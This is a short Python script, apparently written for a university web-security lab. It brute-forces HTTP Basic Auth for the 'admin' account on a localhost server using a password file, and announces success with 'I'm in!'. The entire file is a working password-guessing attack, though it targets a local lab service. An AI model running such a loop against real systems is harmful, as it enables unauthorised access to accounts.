import requests
from requests.auth import HTTPBasicAuth

path = 'C:\Studia\Bezpieczeństwo sieci web\lab01\passwords.txt'

password_file = open(path, 'r').readlines()
url = "http://localhost:3000/endpoint"

for line in password_file:
  password = line.strip()
  res = requests.get(url, auth=HTTPBasicAuth('admin', password))
  print(f"Trying with pass: {password}, result: {res.status_code}")
  if res.status_code == 200:
    print("I'm in! 😈")
    break
